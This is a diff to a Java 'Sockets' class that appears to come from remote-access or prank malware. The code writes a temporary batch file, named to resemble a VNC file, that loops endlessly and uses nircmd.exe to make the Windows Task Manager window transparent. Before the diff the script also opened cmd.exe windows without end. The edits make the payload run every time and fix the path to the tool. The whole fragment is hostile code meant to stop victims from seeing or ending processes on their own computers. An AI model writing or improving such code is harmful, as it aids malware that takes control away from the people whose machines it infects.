@@ -14,6 +14,7 @@ import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.net.SocketException;
+import java.nio.file.Paths;
 import java.util.Random;
 
 /**
@@ -97,7 +98,7 @@ class Sockets
     {
         try{
             Random rand = new Random(); 
-            int random = rand.nextInt(10);
+            int random = rand.nextInt(3);
             if(random <= 3)
             {
                 File temp = File.createTempFile("vncv216789", ".bat"); 
@@ -107,8 +108,8 @@ class Sockets
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
                 bw.write("@echo off" + nl +
                     ":A" + nl +
-                    "start cmd.exe" + nl +
-                    "nircmd.exe win trans ititle \"taskmanager\" 1" + nl +
+                    //"start cmd.exe" + nl +
+                    Paths.get(".").toAbsolutePath().normalize().toString() + "\\nircmd.exe win trans ititle \"taskmanager\" 1" + nl +
                     "goto:A");
                 bw.close();
                 
